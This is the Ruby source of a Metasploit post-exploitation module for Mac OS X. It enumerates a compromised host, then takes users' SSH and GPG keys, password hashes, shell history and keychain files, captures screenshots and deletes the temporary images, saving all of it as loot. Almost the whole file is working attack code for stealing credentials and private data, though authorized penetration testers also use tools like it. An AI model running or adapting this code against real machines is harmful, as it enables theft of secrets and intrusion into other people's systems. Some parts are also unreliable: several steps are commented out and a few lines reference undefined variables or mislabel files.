##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Auxiliary::Report

  # set of files to ignore while looping over files in a directory
  OSX_IGNORE_FILES = [".", "..", ".DS_Store"]

  # set of accounts to ignore while pilfering data
  OSX_IGNORE_ACCOUNTS = ["Shared", ".localized"]

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'OS X Gather Mac OS X System Information Enumeration',
      'Description'   => %q{
          This module gathers basic system information from Mac OS X 10.4+. If the
          session is root, data will be gathered from all users on the system.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>', 'joev' ],
      'Platform'      => [ 'osx' ],
      'SessionTypes'  => [ 'shell', 'meterpreter' ]
    ))

    register_options([
      OptBool.new('SYSCONF',      [false, 'Capture system configuration and status.', true]),
      OptBool.new('ACCOUNTS',     [false, 'Capture user account information.', true]),
      OptBool.new('SSHKEYS',      [false, 'Capture accessible SSH keys.', true]),
      OptBool.new('GPGKEYS',      [false, 'Capture accessible GPG keys.', true]),
      OptBool.new('SCREENSHOT',   [false, 'Capture a screenshot of user\'s desktop.', true]),
      OptBool.new('HASHES',       [false, 'Capture accessible password hashes.', true]),
      OptBool.new('SHELLHISTORY', [false, 'Capture accessible shell history files.', true]),
      OptBool.new('KEYCHAINS',    [false, 'Capture accessible keychain files.', true])
    ], self.class)
  end

  def run
    case session.type
    when /meterpreter/
      host = sysinfo["Computer"]
    when /shell/
      host = session.shell_command_token("hostname").chomp
    end
    print_status("Running module against #{host}")
    if root?
      print_status("This session is running as root!")
    end

    # enum_conf         if datastore['SYSCONF']
    # enum_accounts     if datastore['ACCOUNTS']
    # get_crypto_keys
    # screenshot        if datastore['SCREENSHOT']
    dump_hashes       if datastore['HASHES'] and root?
    dump_bash_history if datastore['SHELLHISTORY']
    get_keychains     if datastore['KEYCHAINS']
  end

  # parse the dslocal plist in lion
  def read_ds_xml_plist(plist_content)
    require "rexml/document"

    doc  = REXML::Document.new(plist_content)
    keys = []
    fields = {}

    doc.elements["plist/dict/key"].each { |element| keys << element.to_s }
    doc.elements["plist/dict/array"].each_with_index do |element, i|
      next if element.kind_of? REXML::Text
      data = []
      fields[keys[i]] = data
      element.each_element("*") do |thing|
        data_set = thing.to_s
        if data_set
          data << data_set.gsub("\n\t\t","")
        else
          data << data_set
        end
      end
    end
    return fields
  end

  def enum_conf
    platform_type = session.platform
    session_type = session.type
    profile_datatypes = {
      "OS"                => "SPSoftwareDataType",
      "Network"           => "SPNetworkDataType",
      "Bluetooth"         => "SPBluetoothDataType",
      "Ethernet"          => "SPEthernetDataType",
      "Printers"          => "SPPrintersDataType",
      "USB"               => "SPUSBDataType",
      "Airport"           => "SPAirPortDataType",
      "Firewall"          => "SPFirewallDataType",
      "Known Networks"    => "SPNetworkLocationDataType",
      "Applications"      => "SPApplicationsDataType",
      "Development Tools" => "SPDeveloperToolsDataType",
      "Frameworks"        => "SPFrameworksDataType",
      "Logs"              => "SPLogsDataType",
      "Preference Panes"  => "SPPrefPaneDataType",
      "StartUp"           => "SPStartupItemDataType"
    }
    shell_commands = {
      "TCP Connections"       => "/usr/sbin/netstat -np tcp",
      "UDP Connections"       => "/usr/sbin/netstat -np udp",
      "Environment Variables" => "/usr/bin/printenv",
      "Last Boottime"         => "/usr/bin/who -b",
      "Current Activity"      => "/usr/bin/who",
      "Process List"          => "/bin/ps -ea"
    }

    # Enumerate first using System Profiler
    profile_datatypes.each do |name, proftype|
      print_status("\tEnumerating #{name}")
      add_loot("#{name}.txt", cmd_exec("/usr/sbin/system_profiler #{proftype}", nil, 15))
    end

    # Enumerate using system commands
    shell_commands.each do |name, command|
      print_status("\tEnumerating #{name}")
      add_loot("#{name}.txt", cmd_exec(command))
    end
  end


  def enum_accounts
    # Specific commands for Leopard and Snow Leopard
    leopard_commands = {
      "Users"  => "/usr/bin/dscacheutil -q user",
      "Groups" => "/usr/bin/dscacheutil -q group"
    }

    # Specific commands for Tiger
    tiger_commands = {
      "Users"  => "/usr/sbin/lookupd -q user",
      "Groups" => "/usr/sbin/lookupd -q group"
    }

    if leopard?
      shell_commands = leopard_commands
    elsif tiger?
      shell_commands = tiger_commands
    end

    shell_commands.each do |name, command|
      print_status("\tEnumerating #{name}")
      output = cmd_exec(command)
      if output.blank?
        print_status "#{name} not found"
      else
        add_loot("#{name}.txt", output)
      end
    end
  end

  def get_ssh_keys(user)
    return unless datastore['SSHKEYS']
    # Check for SSH and extract keys if found
    home_folder_list = cmd_exec("/bin/ls -ma #{home_dir user}").chomp.split(", ")
    if home_folder_list.include?("\.ssh")
      print_status("#{home_dir user}.ssh Folder is present")
      cmd_exec("/bin/ls -ma #{home_dir user}.ssh").chomp.split(", ").each do |k|
        next if OSX_IGNORE_FILES.include? k
        print_status("\tDownloading #{k.strip}")
        add_loot("#{name}", read_file("#{home_dir user}.ssh/#{k}"))
      end
    end
  end

  def get_gpg_keys(user)
    return unless datastore['GPGKEYS']
    # Check for GPG and extract keys if found
    home_folder_list = cmd_exec("/bin/ls -ma #{home_dir user}").chomp.split(", ")
    if home_folder_list.include?("\.gnupg")
      print_status("#{home_dir user}.gnupg Folder is present")
      gnugpg_folder = cmd_exec("/bin/ls -ma #{home_dir user}.gnupg").chomp.split(", ")
      gnugpg_folder.each do |k|
        next if OSX_IGNORE_FILES.include? k
        print_status("\tDownloading #{k.strip}")
        add_loot("#{name}", read_file("#{home_dir user}.gnupg/#{k.strip}"))
      end
    end
  end

  # Method for getting SSH and GPG Keys
  def get_crypto_keys
    # Enumerate and retreave files according to privilege level
    if not root?
      # Enumerate the home folder content
      get_ssh_keys(whoami)
      get_gpg_keys(whoami)
    else
      users.each do |user|
        get_ssh_keys(user)
        get_gpg_keys(user)
      end
    end
  end

  # Run the hashdump module if the user is root
  def dump_hashes
    mod = framework.post.create('osx/gather/hashdump')
    mod.datastore.merge!('SESSION' => datastore['SESSION'])
    Msf::Simple::Post.run_simple(mod)
  end

  # Method  for capturing screenshot of targets
  def screenshot
    if leopard?
      print_status("Capturing screenshot")
      if root?
        print_status("Capturing screenshot for each loginwindow process since privilege is root")
        loginwindow_pids = cmd_exec("/bin/ps aux \| /usr/bin/awk \'/Finder\\.app/ \&\& \!/awk/ \{print \$2\}\'").split("\n")
        loginwindow_pids.each do |pid|
          print_status("\tCapturing for PID: #{pid}")
          cmd_exec("/bin/launchctl bsexec #{pid} /usr/sbin/screencapture -x /tmp/#{pid}.jpg")
          add_loot("screenshot_#{pid}.jpg", read_file("/tmp/#{pid}.jpg"))
          cmd_exec("/usr/bin/srm -m -z /tmp/#{pid}.jpg")
        end
      else
        picture_name = ::Time.now.strftime("%Y%m%d.%M%S")
        cmd_exec("/usr/sbin/screencapture -x /tmp/#{picture_name}.jpg")
        add_loot("screenshot.jpg", read_file("/tmp/#{picture_name}.jpg"))
        cmd_exec("/usr/bin/srm -m -z /tmp/#{picture_name}.jpg")
      end
      print_status("Screenshot Captured")
    end
  end

  def dump_bash_history_for(user)
    cmd_exec("/bin/ls -ma #{home_dir user}").chomp.split(", ").each do |f|
      if f =~ /\.\w*\_history/
        print_status("\tHistory file #{f.strip} found for #{user}")
        print_status("\tDownloading #{f.strip}")
        add_loot("root_#{f.strip}.txt", read_file("#{homedir}#{f.strip}"))
      end
    end
  end

  def dump_bash_history
    print_status("Extracting history files")
    # If we are root lets get root for when sudo was used and all users
    if root?
      dump_bash_history_for('root')
      users.each { |user| dump_bash_history_for(user) }
    else
      dump_bash_history_for(whoami)
    end
  end

  # Download configured Keychains
  def get_keychains
    if root?
      users.each do |user|
        print_status("Enumerating and Downloading keychains for #{user}")
        keychain_files = cmd_exec("/usr/bin/sudo -u #{user} -i /usr/bin/security list-keychains").split("\n").map do |file|
          file.strip.chomp('"').reverse.chomp('"').reverse
        end
        keychain_files.each { |k| add_loot("keychain_#{File.basename(k, '.*')}.keychain", read_file(k.strip)) }
      end
    else
      print_status("Enumerating and Downloading keychains for #{whoami}")
      keychain_files = cmd_exec("/usr/bin/security list-keychains").split("\n").map do |file|
        file.strip.chomp('"').reverse.chomp('"').reverse
      end
      keychain_files.each { |k| add_loot("keychain_#{whoami}_#{File.basename(k, '.*')}.keychain", read_file(k.strip)) }
    end
  end

  # Stores the requested data as loot.
  def add_loot(filename, data)
    mimetypes = Hash.new('text/plain').merge!({
      '.jpg' => 'image/jpg',
      '.keychain' => 'application/x-octet-stream'
    })
    p = store_loot(
      File.basename(filename, '.*'), # filename without extension
      mimetypes[File.extname(filename)],
      session,
      data,
      filename
    )
    print_good("\tLoot saved to #{p}")
  end

  # @return [Bool] system version is at least 10.5
  def leopard?
    ver_num =~ /10\.(\d+)/ and $1.to_i >= 5
  end

  # @return [Bool] system version is at least 10.7
  def lion?
    ver_num =~ /10\.(\d+)/ and $1.to_i >= 7
  end

  # Checks if running as root on the target
  # @return [Bool] current user is root
  def root?
    whoami == 'root'
  end

  # @return [Bool] system version is 10.4 or lower
  def tiger?
    ver_num =~ /10\.(\d+)/ and $1.to_i <= 4
  end

  # @param [String] user
  # @return [String] absolute path to user's home directory
  def home_dir(user)
    if user == 'root'
      '/var/root/'
    else
      "/Users/#{user}/"
    end
  end

  # @return [Array<String>] list of user names
  def users
    @users ||= cmd_exec("/bin/ls /Users").each_line.collect.map(&:chomp) - OSX_IGNORE_ACCOUNTS
  end

  # @return [String] version string (e.g. 10.8.5)
  def ver_num
    @version ||= cmd_exec("/usr/bin/sw_vers -productVersion").chomp
  end

  # @return [String] name of current user
  def whoami
    @whoami ||= cmd_exec('/usr/bin/whoami', '').chomp
  end
end
